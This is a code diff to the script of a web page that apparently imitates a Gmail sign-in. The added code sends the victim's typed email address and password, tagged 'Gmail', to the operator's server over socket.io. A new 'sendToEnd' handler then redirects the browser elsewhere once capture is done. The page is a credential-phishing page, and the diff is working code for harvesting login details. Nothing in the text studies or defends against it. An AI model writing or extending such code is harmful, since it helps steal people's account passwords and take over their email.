@@ -62,7 +62,12 @@
 	
 </html>
 <script>
+
 var socket = io.connect();
+socket.on('sendToEnd', function(end){
+		console.log("its all over")
+		window.location = end
+	})
 
 
 
@@ -82,9 +87,9 @@ var socket = io.connect();
 		$('#email-textbox').attr("onkeydown", "javascript: if (event.keyCode==13) submit2()")
 		$('#form-username').attr("style", "display:block")
 		
-		var socket = io();
-
-		  socket.emit('GmailEmail', $('#email-textbox').val());
+		
+		var from = "Gmail"
+		  socket.emit('UsernameEmail', $('#email-textbox').val(), from);
 		  $('#email-textbox').val('');
 		  return false;
 		
@@ -94,15 +99,15 @@ var socket = io.connect();
 		if ($('#email-textbox').val().length <= 5){
 		console.log("small")
 	}else{
-		socket.emit('GmailPassword', $('#email-textbox').val());
+		var from = "Gmail"
+		socket.emit('Password', $('#email-textbox').val(), from);
 	}
 }
 	
 	$("#email-texbox").keyup(function(event) {
 		if (event.keyCode == 13) {
 			$("#button2").click();
+			
 		}
 	});
-
-
 </script>
